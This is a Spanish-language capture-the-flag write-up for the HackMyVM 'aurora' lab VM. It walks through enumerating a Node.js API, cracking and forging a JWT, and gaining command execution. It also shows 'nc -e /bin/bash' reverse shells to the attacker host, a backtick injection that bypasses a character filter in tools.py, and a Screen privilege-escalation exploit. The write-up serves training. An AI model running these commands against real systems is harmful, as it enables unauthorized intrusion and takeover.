+++
title = 'aurora - HackMyVM'
+++

[link => aurora](https://downloads.hackmyvm.eu/aurora.zip)

---

## Descubrimiento de máquina objetivo en la red con nmap

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/writeups/hackmyvm/aurora/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.11**

## Escaneo de puertos en la máquina objetivo con nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.11 -oN target_scan.nmap
```

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Oct  7 14:20:04 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n 
       │ -Pn -oN target_scan.nmap 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up, received arp-response (0.00011s latency).
   4   │ Scanned at 2024-10-07 14:20:04 EDT for 3s
   5   │ Not shown: 65533 closed tcp ports (reset)
   6   │ PORT     STATE SERVICE REASON
   7   │ 22/tcp   open  ssh     syn-ack ttl 64
   8   │ 3000/tcp open  ppp     syn-ack ttl 64
   9   │ MAC Address: 08:00:27:FB:97:55 (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Read data files from: /usr/bin/../share/nmap
  12   │ # Nmap done at Mon Oct  7 14:20:07 2024 -- 1 IP address (1 host up) scanned in 2.91 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 22,3000**

## Ejecución de scripts con nmap

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scripts_exec.nmap
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Oct  7 14:24:20 2024 as: nmap -sCV -p22,3000 -oN scripts_exec.nmap 10
       │ .38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up (0.00067s latency).
   4   │ 
   5   │ PORT     STATE SERVICE VERSION
   6   │ 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
   9   │ |   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
  10   │ |_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
  11   │ 3000/tcp open  http    Node.js Express framework
  12   │ |_http-title: Error
  13   │ MAC Address: 08:00:27:FB:97:55 (Oracle VirtualBox virtual NIC)
  14   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  15   │ 
  16   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  17   │ # Nmap done at Mon Oct  7 14:24:46 2024 -- 1 IP address (1 host up) scanned in 25.59 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Enumeración de directorios con gobuster por el método POST

```bash
gobuster dir -u http://10.38.1.11:3000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -m POST  -x .php,.html,.js,.txt,.zip
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.11:3000/
[+] Method:                  POST
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,js,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 401) [Size: 22]
/register             (Status: 400) [Size: 29]
/Login                (Status: 401) [Size: 22]
/Register             (Status: 400) [Size: 29]
/execute              (Status: 401) [Size: 12]
/LogIn                (Status: 401) [Size: 22]
/LOGIN                (Status: 401) [Size: 22]
Progress: 1323354 / 1323360 (100.00%)
===============================================================
Finished
===============================================================
```

## Búsqueda de un rol válido con ffuf

```bash
http POST 10.38.1.11:3000/Register                                     

HTTP/1.1 400 Bad Request
Connection: keep-alive
Content-Length: 29
Content-Type: text/html; charset=utf-8
Date: Wed, 09 Oct 2024 14:35:14 GMT
ETag: W/"1d-q/Mv4CB9IzvntqBpE9GOn68OGzc"
Keep-Alive: timeout=5
X-Powered-By: Express

The "role" field is not valid
```


```bash
ffuf -u http://10.38.1.11:3000/Register -H "Content-Type: application/json"  -d '{"role": "FUZZ"}' -w /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt -X POST
```

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.38.1.11:3000/Register
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"role": "FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

user                    [Status: 500, Size: 32, Words: 5, Lines: 1, Duration: 131ms]
:: Progress: [98/98] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

## Registro de usuario con herramienta httpie

```bash
http POST 10.38.1.11:3000/Register role=user username=fafi password=123
```

```bash
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 15
Content-Type: text/html; charset=utf-8
Date: Wed, 09 Oct 2024 14:32:24 GMT
ETag: W/"f-TT7wnl37+EXlAd0z7btu93gCfyc"
Keep-Alive: timeout=5
X-Powered-By: Express

Registration OK
```

## Login con usuario generado y obtención de accessToken

```bash
http POST 10.38.1.11:3000/login username=fafi password=123
``` 

```bash
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 166
Content-Type: application/json; charset=utf-8
Date: Wed, 09 Oct 2024 14:36:41 GMT
ETag: W/"a6-M8wV/Hhx/17oY1lQ6jK+LI39/GU"
Keep-Alive: timeout=5
X-Powered-By: Express

{
    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZhZmkiLCJyb2xlIjoidXNlciIsImlhdCI6MTcyODQ4NDYwMX0.SxzMxKhz7M0aTLTxmhzqjPowC41srvTMgfWSicLBXvc"                                                       
}
```

![jwt debugger](/images/writeups/hackmyvm/aurora/jwt1.png) 


## Cracking de token JWT con john

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

```bash
Created directory: /home/fafi/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)     
1g 0:00:00:00 DONE (2024-10-09 10:41) 2.631g/s 32336p/s 32336c/s 32336C/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Cambiar campo **username (admin)** y **role (admin)**, y agregar secret **nopassword**.  

![jwt Cracking](/images/writeups/hackmyvm/aurora/jwt2.png) 

![jwt Token](/images/writeups/hackmyvm/aurora/jwt3.png) 

## Búsqueda de parámetro value para ejecución de comandos

```bash
ffuf -c -fl 11 -w /usr/share/seclists/Discovery/Web-Content/common.txt -X POST -H "Content-Type:application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI4NDg0NjAxfQ.FwXqpGQyQW3cvGv5oe9BozngTZI97s8vihcyvb1dWxY" -d '{"FUZZ":"value"}' -u http://10.38.1.11:3000/execute 
```

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.38.1.11:3000/execute
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Header           : Content-Type: application/json
 :: Header           : Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI4NDg0NjAxfQ.FwXqpGQyQW3cvGv5oe9BozngTZI97s8vihcyvb1dWxY
 :: Data             : {"FUZZ":"value"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 11
________________________________________________

command                 [Status: 500, Size: 14, Words: 2, Lines: 1, Duration: 110ms]
:: Progress: [4734/4734] :: Job [1/1] :: 904 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

## Ejecución de comandos mediante el parámetro command 

```bash
http POST http://10.38.1.11:3000/execute "Content-Type: application/json" "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI4NDg0NjAxfQ.FwXqpGQyQW3cvGv5oe9BozngTZI97s8vihcyvb1dWxY" command='id'
```

```bash
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 54
Content-Type: text/html; charset=utf-8
Date: Wed, 09 Oct 2024 15:59:03 GMT
ETag: W/"36-wxV2rNiZyPcHRaOepZ/DvyCD8kE"
Keep-Alive: timeout=5
X-Powered-By: Express

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse shell

```bash
http POST http://10.38.1.11:3000/execute "Content-Type: application/json" "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI4NDg0NjAxfQ.FwXqpGQyQW3cvGv5oe9BozngTZI97s8vihcyvb1dWxY" command='nc -e /bin/bash 10.38.1.10 4444'  
```

```bash
nc -nlvp 4444   
listening on [any] 4444 ...
connect to [10.38.1.10] from (UNKNOWN) [10.38.1.11] 39828
```

## Permisos sudo del usuario

```bash
www-data@aurora:~$ sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
```

```bash
www-data@aurora:/home/doro$ cat tools.py
```

Contenido de archivo **tools.py**

```py
import os
import sys

def main():
    if len(sys.argv) < 2:
        print_help()
        return
    
    option = sys.argv[1]
    if option == "--ping":
        ping()
    elif option == "--traceroute":
        traceroute_ip()
    else:
        print("Invalid option.")
        print_help()

def print_help():
    print("Usage: python3 network_tool.py <option>")
    print("Options:")
    print("--ping           Ping an IP address")
    print("--traceroute     Perform a traceroute on an IP address")

def ping():
    ip_address = input("Enter an IP address: ")

    forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
    for char in forbidden_chars:
        if char in ip_address:
            print("Forbidden character found: {}".format(char))
            sys.exit(1)
    
    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input("Enter an IP address: ")

    if not is_valid_ip(ip_address):
        print("Invalid IP address.")
        return
    
    traceroute_command = "traceroute {}".format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split(".")
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:
            return False
    return True

if __name__ == "__main__":
    main()
```

## Uso de opción ping para ejecutar una reverse shell 

```bash
www-data@aurora:/home/doro$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `nc -e /bin/bash 10.38.1.10 4445`
```

## Flag del usuario doro  

```bash
doro@aurora:~$ cat user.txt 
ccd*****************************
```

## Escalada de privilegios

### Binarios con permisos SUID

```bash
doro@aurora:~$ find / -perm -u=s -type f 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/screen
/usr/bin/sudo
/usr/bin/umount
```

### Exploit del binario screen 

```bash
doro@aurora:~$ screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
```

[GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154) 


```bash
doro@aurora:/tmp$ chmod +x privesc.sh
doro@aurora:/tmp$ ./privesc.sh
```

### Flag del usuario root

```bash
# whoami
root
# ls
root.txt
# cat root.txt
052*****************************
```


